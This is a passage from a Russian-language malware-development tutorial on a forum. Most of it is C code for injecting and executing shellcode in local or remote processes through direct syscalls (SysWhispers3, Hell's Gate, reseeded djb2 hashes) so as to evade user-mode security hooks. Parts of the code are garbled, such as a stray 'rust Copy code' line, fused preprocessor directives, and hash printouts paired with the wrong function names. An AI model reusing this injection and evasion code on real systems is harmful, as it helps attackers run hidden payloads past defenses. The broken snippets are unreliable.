    printf(&quot;\t[+] Поток создан с ID: %d \n&quot;, GetThreadId(hThread));

//--------------------------------------------------------------------------

    // Отмена отображения локального представления - только после завершения выполнения полезной нагрузки
    HellsGate(pVxTable-&gt;NtUnmapViewOfSection.wSystemCall);
    if ((STATUS = HellDescent((HANDLE)-1, pLocalAddress)) != 0) {
        printf(&quot;[!] NtUnmapViewOfSection завершилась с ошибкой: 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    // Закрытие дескриптора раздела
    HellsGate(pVxTable-&gt;NtClose.wSystemCall);
    if ((STATUS = HellDescent(hSection)) != 0) {
        printf(&quot;[!] NtClose завершилась с ошибкой: 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    return TRUE;
}</code></pre>
	</div>
</div><br />
<b>Обновление главной функции</b><br />
<br />
Главная функция должна быть обновлена, чтобы вызывать LocalMappingInjectionViaSyscalls вместо <a href="https://github.com/am0nsec/HellsGate/blob/master/HellsGate/main.c#L80" target="_blank" class="link link--external" rel="noopener">payload function</a>. Функция будет использовать выше сгенерированные хэши, как показано ниже.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>INT main() {
    // Getting the PEB structure
    PTEB pCurrentTeb = RtlGetThreadEnvironmentBlock();
    PPEB pCurrentPeb = pCurrentTeb-&gt;ProcessEnvironmentBlock;
    if (!pCurrentPeb || !pCurrentTeb || pCurrentPeb-&gt;OSMajorVersion != 0xA)
        return 0x1;

    // Getting the NTDLL module
    PLDR_DATA_TABLE_ENTRY pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pCurrentPeb-&gt;LoaderData-&gt;InMemoryOrderModuleList.Flink-&gt;Flink - 0x10);

    // Getting the EAT of Ntdll
    PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;
    if (!GetImageExportDirectory(pLdrDataEntry-&gt;DllBase, &amp;pImageExportDirectory) || pImageExportDirectory == NULL)
        return 0x01;

//--------------------------------------------------------------------------
    // Initializing the &#039;Table&#039; structure
    VX_TABLE Table = { 0 };
    Table.NtAllocateVirtualMemory.dwHash = NtAllocateVirtualMemory_djb2;
    if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;Table.NtAllocateVirtualMemory))
        return 0x1;

    Table.NtWriteVirtualMemory.dwHash = NtWriteVirtualMemory_djb2;
    if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;Table.NtWriteVirtualMemory))
        return 0x1;

    Table.NtProtectVirtualMemory.dwHash = NtProtectVirtualMemory_djb2;
    if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;Table.NtProtectVirtualMemory))
        return 0x1;

    Table.NtCreateThreadEx.dwHash = NtCreateThreadEx_djb2;
    if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;Table.NtCreateThreadEx))
        return 0x1;

//--------------------------------------------------------------------------
    // injection code - calling the &#039;ClassicInjectionViaSyscalls&#039; function


// If local injection
#ifdef LOCAL_INJECTION if (!LocalMappingInjectionViaSyscalls(&amp;Table, (HANDLE)-1, Payload, sizeof(Payload)))
        return 0x1;
#endif // LOCAL_INJECTION// If remote injection
#ifdef REMOTE_INJECTION// Open a handle to the target process
    printf(&quot;[i] Targeting process of id : %d \n&quot;, PROCESS_ID);
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PROCESS_ID);
    if (hProcess == NULL) {
        printf(&quot;[!] OpenProcess Failed With Error : %d \n&quot;, GetLastError());
        return -1;
    }

    if (!RemoteMappingInjectionViaSyscalls(&amp;Table, hProcess, Payload, sizeof(Payload)))
        return 0x1;

#endif // REMOTE_INJECTIONreturn 0x00;
}</code></pre>
	</div>
</div><br />
<b>Локальная vs удаленная инъекция</b><br />
<br />
Аналогично предыдущему модулю, был создан макрос-препроцессорный код для целей локального процесса, если LOCAL_INJECTION определено. Пример препроцессорного кода приведен ниже:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>#define LOCAL_INJECTION#ifndef LOCAL_INJECTION#define REMOTE_INJECTION// Установите PID целевого процесса
#define PROCESS_ID    18784    #endif // !LOCAL_INJECTION</code></pre>
	</div>
</div><br />
<b>Давайте теперь перепишем технику Изучаем технику APC Injection | Цикл статей &quot;Изучение вредоносных программ&quot;</b><br />
<br />
Этот модуль реализует технику инъекции APC с использованием прямых системных вызовов, заменяя WinAPI на их эквиваленты с использованием системных вызовов. Выделение памяти и запись полезной нагрузки будут выполняться с использованием функций NtAllocateVirtualMemory, NtProtectVirtualMemory и NtWriteVirtualMemory, которые уже обсуждались в реализации классической инъекции. Оставшийся системный вызов, который будет объяснен, - это NtQueueApcThread.<br />
<br />
QueueUserAPC заменен на NtQueueApcThread.<br />
<br />
<b>NtQueueApcThread<br />
<br />
Этот системный вызов является результатом QueueUserAPC WinAPI. Nиже приведен пример NtQueueApcThread.</b><br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>NTSTATUS NtQueueApcThread(
IN HANDLE ThreadHandle, // Дескриптор потока для выполнения указанной APC
IN PIO_APC_ROUTINE ApcRoutine, // Указатель на предоставленную пользователем функцию APC для выполнения
IN PVOID ApcRoutineContext OPTIONAL, // Указатель на параметр (1) для APC (установлен в NULL)
IN PIO_STATUS_BLOCK ApcStatusBlock OPTIONAL, // Указатель на параметр (2) для APC (установлен в NULL)
IN ULONG ApcReserved OPTIONAL // Указатель на параметр (3) для APC (установлен в NULL)
);</code></pre>
	</div>
</div><br />
Первые два параметра тривиальны для понимания. Оставшиеся три - ApcRoutineContext, ApcStatusBlock и ApcReserved, используются в качестве параметров для функции APC, ApcRoutine.<br />
<br />
<b>Создание потока, поддерживающего сигналы</b><br />
<br />
Поскольку техника инъекции APC требует наличия потока в состоянии, поддерживающем сигналы, это обеспечивается с использованием функции CreateThread WinAPI.<br />
<br />
Функция AlterableFunction будет вызываться жертвенным потоком.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>VOID AlterableFunction() {

HANDLE hEvent = CreateEvent(NULL, NULL, NULL, NULL);

MsgWaitForMultipleObjectsEx(
1,
&amp;hEvent,
INFINITE,
QS_HOTKEY,
MWMO_ALERTABLE
);

}</code></pre>
	</div>
</div><br />
<b>Реализация с использованием GetProcAddress и GetModuleHandle </b><br />
<br />
Создается и инициализируется структура Syscall с помощью функции InitializeSyscallStruct, которая содержит адреса используемых системных вызовов, как показано ниже.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef struct _Syscall {

fnNtAllocateVirtualMemory pNtAllocateVirtualMemory;
fnNtProtectVirtualMemory  pNtProtectVirtualMemory;
fnNtWriteVirtualMemory    pNtWriteVirtualMemory;
fnNtQueueApcThread        pNtQueueApcThread;
} Syscall, * PSyscall;</code></pre>
	</div>
</div><br />
<b>Функция для заполнения структуры &#039;St&#039;</b><br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL InitializeSyscallStruct(OUT PSyscall St) {

rust
Copy code
HMODULE hNtdll =  GetModuleHandle(L&quot;NTDLL.DLL&quot;);
if (!hNtdll) {
    printf(&quot;[!] GetModuleHandle Failed With Error : %d \n&quot;, GetLastError());
    return FALSE;
}

St-&gt;pNtAllocateVirtualMemory  = (fnNtAllocateVirtualMemory)GetProcAddress(hNtdll, &quot;NtAllocateVirtualMemory&quot;);
St-&gt;pNtProtectVirtualMemory   = (fnNtProtectVirtualMemory)GetProcAddress(hNtdll, &quot;NtProtectVirtualMemory&quot;);
St-&gt;pNtWriteVirtualMemory     = (fnNtWriteVirtualMemory)GetProcAddress(hNtdll, &quot;NtWriteVirtualMemory&quot;);
St-&gt;pNtQueueApcThread         = (fnNtQueueApcThread)GetProcAddress(hNtdll, &quot;NtQueueApcThread&quot;);

// Проверка, что GetProcAddress не пропустил системный вызов
if (St-&gt;pNtAllocateVirtualMemory == NULL || St-&gt;pNtProtectVirtualMemory == NULL || St-&gt;pNtWriteVirtualMemory == NULL || St-&gt;pNtQueueApcThread == NULL)
    return FALSE;
else
    return TRUE;
}</code></pre>
	</div>
</div><br />
Далее функция ApcInjectionViaSyscalls будет отвечать за выделение, запись и выполнение полезной нагрузки pPayload в целевом процессе hProcess. Она будет использовать дескриптор жертвенного потока hThread. Функция возвращает FALSE, если не удается выполнить полезную нагрузку, и TRUE, если выполнение прошло успешно.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL ApcInjectionViaSyscalls(IN HANDLE hProcess, IN HANDLE hThread, IN PVOID pPayload, IN SIZE_T sPayloadSize) {

Syscall     St                      = { 0 };
NTSTATUS    STATUS                  = NULL;
PVOID       pAddress                = NULL;
ULONG       uOldProtection          = NULL;
SIZE_T      sSize                   = sPayloadSize,
            sNumberOfBytesWritten   = NULL;

// Инициализация структуры &#039;St&#039; для получения адресов системных вызовов
if (!InitializeSyscallStruct(&amp;St)) {
    printf(&quot;[!] Could Not Initialize The Syscall Struct \n&quot;);
    return FALSE;
}

// Выделение памяти
if ((STATUS = St.pNtAllocateVirtualMemory(hProcess, &amp;pAddress, 0, &amp;sSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) != 0) {
    printf(&quot;[!] NtAllocateVirtualMemory Failed With Error : 0x%0.8X \n&quot;, STATUS);
    return FALSE;
}
printf(&quot;[+] Allocated Address At : 0x%p Of Size : %d \n&quot;, pAddress, sSize);
//--------------------------------------------------------------------------

// Запись полезной нагрузки
printf(&quot;[#] Press &lt;Enter&gt; To Write The Payload ... &quot;);
getchar();
printf(&quot;\t[i] Writing Payload Of Size %d ... &quot;, sPayloadSize);
if ((STATUS = St.pNtWriteVirtualMemory(hProcess, pAddress, pPayload, sPayloadSize, &amp;sNumberOfBytesWritten)) != 0 || sNumberOfBytesWritten != sPayloadSize) {
    printf(&quot;[!] pNtWriteVirtualMemory Failed With Error : 0x%0.8X \n&quot;, STATUS);
    printf(&quot;[i] Bytes Written : %d of %d \n&quot;, sNumberOfBytesWritten, sPayloadSize);
    return FALSE;
}
printf(&quot;[+] DONE \n&quot;);
//--------------------------------------------------------------------------

// Изменение разрешений памяти на RWX
if ((STATUS = St.pNtProtectVirtualMemory(hProcess, &amp;pAddress, &amp;sPayloadSize, PAGE_EXECUTE_READWRITE, &amp;uOldProtection)) != 0) {
    printf(&quot;[!] NtProtectVirtualMemory Failed With Error : 0x%0.8X \n&quot;, STATUS);
    return FALSE;
}
//--------------------------------------------------------------------------

// Выполнение полезной нагрузки с помощью NtQueueApcThread

printf(&quot;[#] Press &lt;Enter&gt; To Run The Payload ... &quot;);
getchar();
printf(&quot;\t[i] Running Payload At 0x%p Using Thread Of Id : %d ... &quot;, pAddress, GetThreadId(hThread));
if ((STATUS = St.pNtQueueApcThread(hThread, pAddress, NULL, NULL, NULL)) != 0) {
    printf(&quot;[!] NtQueueApcThread Failed With Error : 0x%0.8X \n&quot;, STATUS);
    return FALSE;
}
printf(&quot;[+] DONE \n&quot;);

return TRUE;
}</code></pre>
	</div>
</div><br />
<b>Реализация с использованием SysWhispers</b><br />
<br />
Здесь реализация использует SysWhispers3 для обхода пользовательских хуков через прямые системные вызовы. Для этой реализации используется следующая команда для создания необходимых файлов.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>python syswhispers.py -a x64 -c msvc -m jumper_randomized -f NtAllocateVirtualMemory,NtProtectVirtualMemory,NtWriteVirtualMemory,NtQueueApcThread -o SysWhispers -v</code></pre>
	</div>
</div><br />
Генерируются три файла: SysWhispers.h, SysWhispers.c и SysWhispers-asm.x64.asm.<br />
Следующим шагом является импорт этих файлов в Visual Studio, как было продемонстрировано ранее. Функция ApcInjectionViaSyscalls приведена ниже.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL ApcInjectionViaSyscalls(IN HANDLE hProcess, IN HANDLE hThread, IN PVOID pPayload, IN SIZE_T sPayloadSize) {

Syscall     St                      = { 0 };
NTSTATUS    STATUS                  = NULL;
PVOID       pAddress                = NULL;
ULONG       uOldProtection          = NULL;
SIZE_T      sSize                   = sPayloadSize,
            sNumberOfBytesWritten   = NULL;

// Выделение памяти
if ((STATUS = NtAllocateVirtualMemory(hProcess, &amp;pAddress, 0, &amp;sSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) != 0) {
    printf(&quot;[!] NtAllocateVirtualMemory Failed With Error : 0x%0.8X \n&quot;, STATUS);
    return FALSE;
}
printf(&quot;[+] Allocated Address At : 0x%p Of Size : %d \n&quot;, pAddress, sSize);
//--------------------------------------------------------------------------

// Запись полезной нагрузки
printf(&quot;[#] Press &lt;Enter&gt; To Write The Payload ... &quot;);
getchar();
printf(&quot;\t[i] Writing Payload Of Size %d ... &quot;, sPayloadSize);
if ((STATUS = NtWriteVirtualMemory(hProcess, pAddress, pPayload, sPayloadSize, &amp;sNumberOfBytesWritten)) != 0 || sNumberOfBytesWritten != sPayloadSize) {
    printf(&quot;[!] pNtWriteVirtualMemory Failed With Error : 0x%0.8X \n&quot;, STATUS);
    printf(&quot;[i] Bytes Written : %d of %d \n&quot;, sNumberOfBytesWritten, sPayloadSize);
    return FALSE;
}
printf(&quot;[+] DONE \n&quot;);
//--------------------------------------------------------------------------

// Изменение разрешений памяти на RWX
if ((STATUS = NtProtectVirtualMemory(hProcess, &amp;pAddress, &amp;sPayloadSize, PAGE_EXECUTE_READWRITE, &amp;uOldProtection)) != 0) {
    printf(&quot;[!] NtProtectVirtualMemory Failed With Error : 0x%0.8X \n&quot;, STATUS);
    return FALSE;
}
//--------------------------------------------------------------------------

// Выполнение полезной нагрузки с помощью NtQueueApcThread

printf(&quot;[#] Press &lt;Enter&gt; To Run The Payload ... &quot;);
getchar();
printf(&quot;\t[i] Running Payload At 0x%p Using Thread Of Id : %d ... &quot;, pAddress, GetThreadId(hThread));
if ((STATUS = NtQueueApcThread(hThread, pAddress, NULL, NULL, NULL)) != 0) {
    printf(&quot;[!] NtQueueApcThread Failed With Error : 0x%0.8X \n&quot;, STATUS);
    return FALSE;
}
printf(&quot;[+] DONE \n&quot;);

return TRUE;
}</code></pre>
	</div>
</div><br />
<b>Реализация с использованием Hell&#039;s Gate</b><br />
<br />
Последняя реализация для этого модуля использует Hell&#039;s Gate. Сначала убедитесь, что здесь выполняются те же шаги, что и для настройки проекта Visual Studio с SysWhispers3. В частности, включение MASM и изменение свойств для компиляции файла ASM с использованием Microsoft Macro Assembler.<br />
<br />
<b>Обновление структуры VX_TABLE</b><br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef struct _VX_TABLE {
VX_TABLE_ENTRY NtAllocateVirtualMemory;
VX_TABLE_ENTRY NtWriteVirtualMemory;
VX_TABLE_ENTRY NtProtectVirtualMemory;
VX_TABLE_ENTRY NtQueueApcThread;
} VX_TABLE, * PVX_TABLE;</code></pre>
	</div>
</div><br />
<b>Обновление значения начального числа (seed)</b><br />
<br />
Для <a href="https://github.com/am0nsec/HellsGate/blob/master/HellsGate/main.c#L93" target="_blank" class="link link--external" rel="noopener">замены старого значения</a> начального числа будет использоваться новое значение, чтобы изменить хэш-значения системных вызовов. Функция хеширования djb2 обновляется новым значением начального числа, как показано ниже.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>DWORD64 djb2(PBYTE str) {
    DWORD64 dwHash = 0x77347734DEADBEEF; // Old value: 0x7734773477347734
    INT c;

    while (c = *str++)
        dwHash = ((dwHash &lt;&lt; 0x5) + dwHash) + c;

    return dwHash;
}</code></pre>
	</div>
</div><br />
Следующие операторы printf должны быть добавлены в новый проект для генерации хэш-значений djb2 (По аналогии с примерами выше, напишите консольную программу).<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>printf(&quot;#define %s%s 0x%p \n&quot;, &quot;NtAllocateVirtualMemory&quot;, &quot;_djb2&quot;, (DWORD64)djb2(&quot;NtCreateSection&quot;));
printf(&quot;#define %s%s 0x%p \n&quot;, &quot;NtWriteVirtualMemory&quot;, &quot;_djb2&quot;, djb2(&quot;NtMapViewOfSection&quot;));
printf(&quot;#define %s%s 0x%p \n&quot;, &quot;NtProtectVirtualMemory&quot;, &quot;_djb2&quot;, djb2(&quot;NtUnmapViewOfSection&quot;));
printf(&quot;#define %s%s 0x%p \n&quot;, &quot;NtQueueApcThread&quot;, &quot;_djb2&quot;, djb2(&quot;NtClose&quot;));
printf(&quot;#define %s%s 0x%p \n&quot;, &quot;NtCreateThreadEx&quot;, &quot;_djb2&quot;, djb2(&quot;NtCreateThreadEx&quot;));</code></pre>
	</div>
</div><br />
После генерации значений добавьте их в начало проекта Hell&#039;s Gate.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>#define NtAllocateVirtualMemory_djb2 0x7B2D1D431C81F5F6
#define NtWriteVirtualMemory_djb2    0x54AEE238645CCA7C
#define NtProtectVirtualMemory_djb2  0xA0DCC2851566E832
#define NtQueueApcThread_djb2        0x331E6B6B7E696022</code></pre>
	</div>
</div><br />
<b>Функция ApcInjectionViaSyscalls</b><br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>BOOL ApcInjectionViaSyscalls(IN PVX_TABLE pVxTable, IN HANDLE hProcess, IN HANDLE hThread, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {

    Syscall     St                      = { 0 };
    NTSTATUS    STATUS                  = NULL;
    PVOID       pAddress                = NULL;
    ULONG       uOldProtection          = NULL;
    SIZE_T      sSize                   = sPayloadSize,
                sNumberOfBytesWritten   = NULL;

    // Allocating memory
    HellsGate(pVxTable-&gt;NtAllocateVirtualMemory.wSystemCall);
    if ((STATUS = HellDescent(hProcess, &amp;pAddress, 0, &amp;sSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) != 0) {
        printf(&quot;[!] NtAllocateVirtualMemory Failed With Error : 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }
    printf(&quot;[+] Allocated Address At : 0x%p Of Size : %d \n&quot;, pAddress, sSize);

//--------------------------------------------------------------------------

    // Writing the payload
    printf(&quot;[#] Press &lt;Enter&gt; To Write The Payload ... &quot;);
    getchar();
    printf(&quot;\t[i] Writing Payload Of Size %d ... &quot;, sPayloadSize);
    HellsGate(pVxTable-&gt;NtWriteVirtualMemory.wSystemCall);
    if ((STATUS = HellDescent(hProcess, pAddress, pPayload, sPayloadSize, &amp;sNumberOfBytesWritten)) != 0 || sNumberOfBytesWritten != sPayloadSize) {
        printf(&quot;[!] pNtWriteVirtualMemory Failed With Error : 0x%0.8X \n&quot;, STATUS);
        printf(&quot;[i] Bytes Written : %d of %d \n&quot;, sNumberOfBytesWritten, sPayloadSize);
        return FALSE;
    }
    printf(&quot;[+] DONE \n&quot;);

//--------------------------------------------------------------------------

    // Changing the memory&#039;s permissions to RWX
    HellsGate(pVxTable-&gt;NtProtectVirtualMemory.wSystemCall);
    if ((STATUS = HellDescent(hProcess, &amp;pAddress, &amp;sPayloadSize, PAGE_EXECUTE_READWRITE, &amp;uOldProtection)) != 0) {
        printf(&quot;[!] NtProtectVirtualMemory Failed With Error : 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

//--------------------------------------------------------------------------

    // Executing the payload via NtQueueApcThread

    printf(&quot;[#] Press &lt;Enter&gt; To Run The Payload ... &quot;);
    getchar();
    printf(&quot;\t[i] Running Payload At 0x%p Using Thread Of Id : %d ... &quot;, pAddress, GetThreadId(hThread));
    HellsGate(pVxTable-&gt;NtQueueApcThread.wSystemCall);
    if ((STATUS = HellDescent(hThread, pAddress, NULL, NULL, NULL)) != 0) {
        printf(&quot;[!] NtQueueApcThread Failed With Error : 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }
    printf(&quot;[+] DONE \n&quot;);


    return TRUE;
}</code></pre>
	</div>
</div><br />
<b>Удаленная инъекция</b><br />
<br />
Возможно использовать функцию ApcInjectionViaSyscalls для удаленной инъекции в процесс, но для этого необходимо создать приостановленный процесс. Этот подход обсуждался <a href="https://ru-sfera.pw/threads/razrabotka-virusov-19-izuchaem-texniku-apc-injection.4451/" target="_blank" class="link link--external" rel="noopener">здесь</a><br />
<br />
<b>Обновление основной функции</b><br />
<br />
Основную функцию (<a href="https://github.com/am0nsec/HellsGate/blob/master/HellsGate/main.c#L49" target="_blank" class="link link--external" rel="noopener">wmain</a>) необходимо обновить для использования функции ApcInjectionViaSyscalls <a href="https://github.com/am0nsec/HellsGate/blob/master/HellsGate/main.c#L80" target="_blank" class="link link--external" rel="noopener">вместо функции полезной нагрузки.</a><br />
<br />
<b>Демонстрация </b><br />
<br />
Использование реализации с использованием SysWhispers.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746786936098.png"
		data-src="https://osint42.org/attachments/1746786936098-png.239/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../../../attachments/1746786936098-png.239/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746786936098.png"
			title="1746786936098.png"
			width="1881" height="916" loading="lazy" />
	</div><br />
<br />
Использование Hell&#039;s Gate<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746786944668.png"
		data-src="https://osint42.org/attachments/1746786944668-png.240/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../../../attachments/1746786944668-png.240/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746786944668.png"
			title="1746786944668.png"
			width="1845" height="816" loading="lazy" />
	</div></div>
					
										

					
						<div style="padding-top: 10px;">
							
														
									<dl class="blockStatus blockStatus--info blockStatus--standalone">
										<dt></dt>
										<dd class="blockStatus-message amsNextPage">
											<span class="">Следующая страница цикла:</span>
											<a href="../cherpayem-sily-v-antiotladke.31/index.html" class="" title="Черпаем силы в антиотладке">Черпаем силы в антиотладке</a>
										</dd>
									</dl>
								

								

														
									<dl class="blockStatus blockStatus--info blockStatus--standalone">
										<dt></dt>
										<dd class="blockStatus-message amsPreviousPage">
											<span class="">Предыдущая статья цикла:</span>
											<a href="../predel-naya-tekhnika-razborka-s-siskolami.29/index.html" class="" title="Предельная техника. Разборка с сисколами">Предельная техника. Разборка с сисколами</a>
										</dd>
									</dl>
								
							

							
						</div>
					

					
						

						
					

					

					<div class="reactionsBar js-reactionsList ">
						
					</div>

					<div class="js-historyTarget toggleTarget" data-href="trigger-href"></div>
				</article>
			</div>
		</div>
	</div>
	
	
</div>










	<div class="columnContainer"
		data-xf-init="lightbox"
		data-lb-id="article-6"
		data-lb-universal="0">

		<span class="u-anchorTarget" id="comments"></span>

		<div class="columnContainer-comments">
			
	
	

	<div class="block block--messages"
		data-xf-init=""
		data-type="ams_comment"
		data-href="/inline-mod/">

		
	
	


		<div class="block-outer"></div>
		
		<div class="block-container"
			data-xf-init="select-to-quote"
			data-message-selector=".js-comment">
			
			<h3 class="block-header">Комментарии</h3>
			<div class="block-body js-replyNewCommentContainer">
				
					<span class="u-anchorTarget" id="comments"></span>
					
						
							
	
	

	<article class="message message--simple message--comment js-comment js-inlineModContainer"
		data-author="vivty"
		data-content="ams-comment-25"
		id="js-comment-25">

		<span class="u-anchorTarget" id="ams-comment-25"></span>

		<div class="message-inner">
			<div class="message-cell message-cell--user">
				
	<header class="message-user"
		
		itemscope itemtype="https://schema.org/Person"
		itemid="https://osint42.org/members/vivty.94/">

		
			<meta itemprop="name" content="vivty" />
			
				<meta itemprop="url" content="https://osint42.org/members/vivty.94/" />
			
		

		<div class="message-avatar">
			<div class="message-avatar-wrapper">
				<a href="https://osint42.org/members/vivty.94/" class="avatar avatar--s avatar--default avatar--default--dynamic" data-user-id="94" data-xf-init="member-tooltip" style="background-color: #3d0f3d; color: #cc33cc">
			<span class="avatar-u94-s" role="img" aria-label="vivty">V</span> 
		</a>
			</div>
		</div>
		<span class="message-userArrow"></span>
	</header>

			</div>
			<div class="message-cell message-cell--main">
				<div class="js-quickEditTarget">
					<div class="message-content js-messageContent">
						<header class="message-attribution message-attribution--plain">
							<ul class="listInline listInline--bullet">
								<li class="message-attribution-user">
									<a href="https://osint42.org/members/vivty.94/" class="avatar avatar--xxs avatar--default avatar--default--dynamic" data-user-id="94" data-xf-init="member-tooltip" style="background-color: #3d0f3d; color: #cc33cc">
			<span class="avatar-u94-s" role="img" aria-label="vivty">V</span> 
		</a>
									<h4 class="attribution"><a href="https://osint42.org/members/vivty.94/" class="username " dir="auto" data-user-id="94" data-xf-init="member-tooltip"><span class="username--style2">vivty</span></a></h4>
								</li>
								<li>
									<a href="../../../comments/25/index.html" class="u-concealed"><time  class="u-dt" dir="auto" datetime="2025-06-12T18:12:34+0300" data-timestamp="1749741154" data-date="12.06.2025" data-time="18:12" data-short="12 Июн" title="12.06.2025 в 18:12">12.06.2025</time></a>
								</li>
							</ul>
						</header>

						
						
						

						<div class="message-userContent lbContainer js-lbContainer"
							data-lb-id="ams-comment-25"
							data-lb-caption-desc="vivty &middot; 12.06.2025 в 18:12">

							<article class="message-body js-selectToQuote">
								<div class="bbWrapper">Отличные статьи.<br />
Спасибо!</div>
								<div class="js-selectToQuoteEnd">&nbsp;</div>
							</article>

							
						</div>

						

						
							
	

						
					</div>

					<footer class="message-footer">
						

						<div class="reactionsBar js-reactionsList ">
							
						</div>
					</footer>

					<div class="js-historyTarget toggleTarget" data-href="trigger-href"></div>
				</div>
			</div>
		</div>
	</article>

						
					
						
							
	
	

	<article class="message message--simple message--comment js-comment js-inlineModContainer"
		data-author="HMCoba"
		data-content="ams-comment-27"
		id="js-comment-27">

		<span class="u-anchorTarget" id="ams-comment-27"></span>

		<div class="message-inner">
			<div class="message-cell message-cell--user">
				
	<header class="message-user"
		
		itemscope itemtype="https://schema.org/Person"
		itemid="https://osint42.org/members/hmcoba.102/">

		
			<meta itemprop="name" content="HMCoba" />
			
				<meta itemprop="url" content="https://osint42.org/members/hmcoba.102/" />
			
		

		<div class="message-avatar">
			<div class="message-avatar-wrapper">
